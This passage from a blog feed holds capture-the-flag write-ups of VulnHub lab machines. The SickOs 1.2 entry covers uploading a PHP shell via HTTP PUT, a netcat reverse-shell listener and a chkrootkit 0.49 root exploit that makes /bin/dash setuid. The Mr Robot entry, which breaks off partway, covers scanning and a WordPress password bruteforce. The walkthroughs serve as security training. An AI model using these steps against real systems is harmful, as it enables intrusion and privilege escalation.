[ CVE-2016-1531 local root exploit</p>

<h1>whoami</h1>

<p>root
```</p>

<p>The flag is mine!</p>

<p>```</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations you found the flag</p>

<hr />

<h6>((((((((((((((((((((((((((((((</h6>

<h6>###   (((((((((((((((((((((((((((</h6>

<p>,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                   <br/>
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                  <br/>
@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</p>

<h6>####   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<h6>#   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<p>```</p>

<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: How many Zen masters does it take to \
| screw in a light bulb? A: None. The     |
| Universe spins the bulb, and the Zen    |
| master stays out                        |
|                                         |
\ of the way.                             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
    <updated>2017-07-03T04:20:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>

<!-- more -->


<p></p>

<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>

<p>```
nmap -T4 -p22,80 -sV 192.168.217.146</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-03 09:11 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00030s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
```</p>

<p>The web server serves this pic:</p>

<p><img class="center" src="/images/pentest/sickos/2-blow.jpg" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>

<p>```</p>

<!-- NOTHING IN HERE ///\\\ -->


<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>

<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>

<p>First, I needed to verify if PUT is allowed in the first place:</p>

<p><code>
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
</code></p>

<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT'ing things on a server:</p>

<p>```
nmap -p 80 192.168.217.146 &mdash;script http-put &mdash;script-args http-put.url=&lsquo;/test/shell.php&rsquo;,http-put.file=&lsquo;/root/Desktop/shell.php&rsquo;</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-04 04:36 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00031s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-put: /test/shell.php was successfully created
```</p>

<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>

<p><code>
nc -vnlp 443
listening on [any] 443 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
</code></p>

<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>

<p>```
$ ls -al /etc/cron*
-rw-r&mdash;r&mdash; 1 root root  722 Jun 19  2012 /etc/crontab</p>

<p>ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
-rw-r&mdash;r&mdash;  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```</p>

<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>

<p><code>
$ chkrootkit -V
chkrootkit version 0.49
</code></p>

<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>

<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>

<p>```
$ cat /etc/shells</p>

<h1>/etc/shells: valid login shells</h1>

<p>/bin/sh
/bin/dash
/bin/bash
/bin/rbash
$ ls -l /bin/*sh
-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash &ndash;> bash
lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh &ndash;> dash
lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh &ndash;> busybox
```</p>

<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>

<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>

<p>```
$ cat update</p>

<h1>!/bin/bash</h1>

<p>chmod u+s /bin/dash
```</p>

<p>Then I waited a minute for cron to run and got root:</p>

<p>```
$ /bin/dash
/bin/dash</p>

<h1>whoami</h1>

<p>whoami
root
```</p>

<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>

<p>```</p>

<h1>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</h1>

<p>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have &ldquo;Sucessfully!!&rdquo; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</p>

<p>Thanks for giving this try.</p>

<p>@vulnhub: Thanks for hosting this UP!.
```</p>

<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>

<p>```</p>

<hr />

<p>/ Tomorrow will be cancelled due to lack \
\ of interest.                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owning Mr Robot]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
    <updated>2017-07-01T04:46:24-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>

<!-- more -->


<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>

<p>```
masscan -p1-65535 &mdash;banners 192.168.217.145 &mdash;rate=10000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-07-01 08:49:44 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 443/tcp on 192.168.217.145                              <br/>
Discovered open port 80/tcp on 192.168.217.145</p>

<p>nmap -T4 -p80,443 -A 192.168.217.145
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
443/tcp open  ssl/http Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```</p>

<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>

<p><img class="center" src="/images/pentest/mr-robot/fsociety.png" title="&lsquo;fsociety&rsquo; &lsquo;fsociety login&rsquo;" ></p>

<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>

<ul>
<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/deflated.png" title="&lsquo;sports scandal&rsquo; &lsquo;sports scandal&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/space.png" title="&lsquo;space rocket&rsquo; &lsquo;space rocket&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/meast.png" title="&lsquo;middle east&rsquo; &lsquo;middle east&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/gala.png" title="&lsquo;gala&rsquo; &lsquo;celebrity gala&rsquo;" ></p>

<ul>
<li>question &ndash; more pictures with hard to accept truths</li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/america.png" title="&lsquo;patriot&rsquo; &lsquo;american dream&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/executive.png" title="&lsquo;executive&rsquo; &lsquo;executive stealing&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/capitalist.png" title="&lsquo;capitalism&rsquo; &lsquo;capitalism&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/bzns.png" title="&lsquo;business&rsquo; &lsquo;business&rsquo;" ></p>

<ul>
<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/mail.png" title="&lsquo;enter your mail&rsquo; &lsquo;enter your mail&rsquo;" ></p>

<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>

<p><img class="center" src="/images/pentest/mr-robot/whois.png" title="&lsquo;whois mr robot&rsquo; &lsquo;whois mr robot&rsquo;" ></p>

<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>

<ul>
<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
<li><p>elliot &ndash; shows a GIF</p></li>
<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
<li><p>restart &ndash; another scene from the series</p></li>
<li><p>join &ndash; get in touch with Mr Robot</p></li>
<li><p>archive &ndash; shows some of the above commands</p></li>
</ul>


<h2>Flag #1</h2>

<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>

<p><code>
User-agent: *
fsocity.dic
key-1-of-3.txt
</code></p>

<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>

<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>

<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>

<h3>uniscan description</h3>

<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>

<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>

<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>

<p><img class="center" src="/images/pentest/mr-robot/uniscan-gui.png" title="&lsquo;uniscan-gui&rsquo; &lsquo;uniscan gui&rsquo;" ></p>

<h3>uniscan options</h3>

<p>```</p>

<h6>#</h6>

<h1>Uniscan project</h1>

<h1><a href="http://uniscan.sourceforge.net/">http://uniscan.sourceforge.net/</a></h1>

<h6>#</h6>

<ol type="a">
<li>6.3</li>
</ol>


<p>OPTIONS:</p>

<pre><code>-h  help
-u  &lt;url&gt; example: https://www.example.com/
-f  &lt;file&gt; list of url's
-b  Uniscan go to background
-q  Enable Directory checks
-w  Enable File checks
-e  Enable robots.txt and sitemap.xml check
-d  Enable Dynamic checks
-s  Enable Static checks
-r  Enable Stress checks
-i  &lt;dork&gt; Bing search
-o  &lt;dork&gt; Google search
-g  Web fingerprint
-j  Server fingerprint
</code></pre>

<p>usage:
[1] perl ./uniscan.pl -u <a href="http://www.example.com/">http://www.example.com/</a> -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i &ldquo;ip:xxx.xxx.xxx.xxx&rdquo;
[5] perl ./uniscan.pl -o &ldquo;inurl:test&rdquo;
[6] perl ./uniscan.pl -u <a href="https://www.example.com/">https://www.example.com/</a> -r
```</p>

<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>

<p>```
Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| [+] Crawling finished, 59 URL&rsquo;s found!</p>

<p>Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
```</p>

<p>And the tool did find some useful information for further compromising the target!</p>

<h1>``` </h1>

<p>|
| Directory check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/Image/">http://192.168.217.145/Image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/">http://192.168.217.145/admin/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/feed/">http://192.168.217.145/feed/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/image/">http://192.168.217.145/image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/login/">http://192.168.217.145/login/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/rss/">http://192.168.217.145/rss/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-login/">http://192.168.217.145/wp-login/</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-admin/">http://192.168.217.145/wp-admin/</a></h1>

<p>|                                                                                                 <br/>
| File check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.html">http://192.168.217.145/admin/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.php">http://192.168.217.145/admin/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/favicon.ico">http://192.168.217.145/favicon.ico</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html">http://192.168.217.145/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html%20">http://192.168.217.145/index.html%20</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.php">http://192.168.217.145/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/license.txt">http://192.168.217.145/license.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme">http://192.168.217.145/readme</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/sqlqhit.asp">http://192.168.217.145/search/htx/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/SQLQHit.asp">http://192.168.217.145/search/htx/SQLQHit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/sqlqhit.asp">http://192.168.217.145/search/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/SQLQHit.asp">http://192.168.217.145/search/SQLQHit.asp</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/sitemap.xml">http://192.168.217.145/sitemap.xml</a></h1>

<p>```</p>

<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>

<h3>wpscan description</h3>

<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>

<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<h3>wpscan options</h3>

<p>```
wpscan &mdash;help</p>

<hr />

<pre><code>    __          _______   _____                  
    \ \        / /  __ \ / ____|                 
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team 
                   Version 2.9.2
      Sponsored by Sucuri - https://sucuri.net
</code></pre>

<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>

<hr />

<p>Help :</p>

<p>Some values are settable in a config file, see the example.conf.json</p>

<p>&mdash;update                            Update the database to the latest version.
&mdash;url       | -u <target url>       The WordPress URL/domain to scan.
&mdash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
&mdash;enumerate | -e [option(s)]        Enumeration.
  option :</p>

<pre><code>u        usernames from id 1 to 10
u[10-20] usernames from id 10 to 20 (you must write [] chars)
p        plugins
vp       only vulnerable plugins
ap       all plugins (can take a long time)
tt       timthumbs
t        themes
vt       only vulnerable themes
at       all themes (can take a long time)
</code></pre>

<p>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</p>

<p>&mdash;exclude-content-based &ldquo;<regexp or string>&rdquo;</p>

<pre><code>                                Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
                                You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</code></pre>

<p>&mdash;config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
&mdash;user-agent   | -a &lt;User-Agent>    Use the specified User-Agent.
&mdash;cookie <string>                   String to read cookies from.
&mdash;random-agent | -r                 Use a random User-Agent.
&mdash;follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
&mdash;batch                             Never ask for user input, use the default behaviour.
&mdash;no-color                          Do not use colors in the output.
&mdash;log                               Creates a log.txt file with WPScan&rsquo;s output.
&mdash;no-banner                         Prevents the WPScan banner from being displayed.
&mdash;disable-accept-header             Prevents WPScan sending the Accept HTTP header.
&mdash;disable-referer                   Prevents setting the Referer header.
&mdash;disable-tls-checks                Disables SSL/TLS certificate verification.
&mdash;wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.</p>

<pre><code>                                Subdirectories are allowed.
</code></pre>

<p>&mdash;wp-plugins-dir <wp plugins dir>   Same thing than &mdash;wp-content-dir but for the plugins directory.</p>

<pre><code>                                If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</code></pre>

<p>&mdash;proxy &lt;[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.</p>

<pre><code>                                If no protocol is given (format host:port), HTTP will be used.
</code></pre>

<p>&mdash;proxy-auth &lt;username:password>    Supply the proxy login credentials.
&mdash;basic-auth &lt;username:password>    Set the HTTP Basic authentication.
&mdash;wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
&mdash;username | -U <username>          Only brute force the supplied username.
&mdash;usernames     &lt;path-to-file>      Only brute force the usernames from the file.
&mdash;cache-dir       &lt;cache-directory> Set the cache directory.
&mdash;cache-ttl       &lt;cache-ttl>       Typhoeus cache TTL.
&mdash;request-timeout &lt;request-timeout> Request Timeout.
&mdash;connect-timeout &lt;connect-timeout> Connect Timeout.
&mdash;threads  | -t <number of threads> The number of threads to use when multi-threading requests.
&mdash;max-threads     &lt;max-threads>     Maximum Threads.
&mdash;throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the &mdash;threads should be set to 1.
&mdash;help     | -h                     This help screen.
&mdash;verbose  | -v                     Verbose output.
&mdash;version                           Output the current version and exit.</p>

<p>Examples :</p>

<p>-Further help &hellip;
ruby ./wpscan.rb &mdash;help</p>

<p>-Do &lsquo;non-intrusive&rsquo; checks &hellip;
ruby ./wpscan.rb &mdash;url www.example.com</p>

<p>-Do wordlist password brute force on enumerated users using 50 threads &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;threads 50</p>

<p>-Do wordlist password brute force on the &lsquo;admin&rsquo; username only &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;username admin</p>

<p>-Enumerate installed plugins &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate p</p>

<p>-Enumerate installed themes &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate t</p>

<p>-Enumerate users &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate u</p>

<p>-Enumerate installed timthumbs &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate tt</p>

<p>-Use a HTTP proxy &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy 127.0.0.1:8118</p>

<p>-Use a SOCKS5 proxy &hellip; (cURL >= v7.21.7 needed)
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy socks5://127.0.0.1:9000</p>

<p>-Use custom content directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-content-dir custom-content</p>

<p>-Use custom plugins directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-plugins-dir wp-content/custom-plugins</p>

<p>-Update the DB &hellip;
ruby ./wpscan.rb &mdash;update</p>

<p>-Debug output &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;debug-output 2>debug.log</p>

<p>See README for further information.
```</p>

<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145">http://192.168.217.145</a> &mdash;enumerate u vp vt &mdash;no-banner
[+] URL: <a href="http://192.168.217.145/">http://192.168.217.145/</a>
[+] Started: Sat Jul  1 07:40:05 2017</p>

<p>[+] robots.txt available under: &lsquo;<a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>&rsquo;
[!] The WordPress &lsquo;<a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>&rsquo; file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: <a href="http://192.168.217.145/xmlrpc.php">http://192.168.217.145/xmlrpc.php</a></p>

<p>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
[!] 1 vulnerability identified from the version number</p>

<p>[!] Title: WordPress 2.3-4.7.5 &ndash; Host Header Injection in Password Reset</p>

<pre><code>Reference: https://wpvulndb.com/vulnerabilities/8807
Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
</code></pre>

<p>[+] Enumerating plugins from passive detection &hellip;
[+] No plugins found</p>

<p>[+] Enumerating usernames &hellip;
[+] We did not enumerate any usernames</p>

<p>[+] Finished: Sat Jul  1 07:40:07 2017
[+] Requests Done: 57
[+] Memory used: 17.109 MB
[+] Elapsed time: 00:00:02
```</p>

<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>

<p><code>
wc -l fsocity.dic
858160 fsocity.dic
</code></p>

<p>Not a small one, but maybe it contains duplicates:</p>

<p><code>
sort fsocity.dic | uniq | wc -l
11451
</code></p>

<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>

<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>

<p><img class="center" src="/images/pentest/mr-robot/wplogin.png" title="&lsquo;wplogin&rsquo; &lsquo;wplogin&rsquo;" ></p>

<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145/">http://192.168.217.145/</a> &mdash;wordlist ~/Downloads/fsociety.txt &mdash;username elliot
[&hellip;]
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652</p>

<p>  Brute Forcing &lsquo;elliot&rsquo; Time: 00:02:27 &lt;==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
